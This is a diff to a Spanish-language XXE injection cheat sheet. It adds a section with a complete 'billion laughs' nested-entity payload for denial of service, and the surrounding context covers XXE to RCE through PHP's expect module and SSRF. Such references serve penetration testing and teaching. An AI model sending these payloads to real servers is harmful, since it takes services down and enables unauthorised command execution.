@@ -16,6 +16,7 @@ Algo metodos de inyectar una XXE.
    2.1. [XXE a LFI](#XXEaLFI)<br>
    2.2. [XXE a SSRF](#XXEaSSRF)<br>
    2.3. [XXE a RCE](#XXEaRCE)
+   2.4  [XXE a DOS](#XXEaDOS)
 6. [Blind en peticion](#BlindXXE)
 7. [Bypass XXE](#XXEBypass)
 8. [Out-Of-Band](#OutOFBand)
@@ -38,6 +39,9 @@ Si el servidor dispone del modulo "expect" de PHP, seria posible ejecutar codigo
 Ejemplo: 
 [XXE a RCE](#XXEaRCE)
 - **Denegacion del servicio**
+Causa una denegacion de servicio mediante repetidas llamadas en las funciones entitys<br>
+Ejemplo: 
+[XXE a DOS](#XXEaDOS)
 
 ---
 
@@ -60,7 +64,7 @@ Enumerar la red local del servidor
 <foo>&xxe;</foo>
 ```
 
-**2.3-XXE a RCE** <a name="XXEaRCE"></a><br>
+**2.3- XXE a RCE** <a name="XXEaRCE"></a><br>
 Abusando del modulo expect de php para ejecutar comandos
 (Se requiere tener este modulo en el servidor)
 ```xml
@@ -72,7 +76,25 @@ Abusando del modulo expect de php para ejecutar comandos
        <storeId>2</storeId>
     </checkproduct>
 ```
-
+**2.4- XXE a DOS** <a name="XXEaDOS"></a><br>
+Causa una denegacion de servicio mediante repetidas llamadas en las funciones de las entity's
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+<!ENTITY lol "lol">
+<!ELEMENT lolz (#PCDATA)>
+<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+]>
+<lolz>&lol9;</lolz>
+```
 ---
 
 ### 3- XXE blind en peticion <a name="BlindXXE"></a>
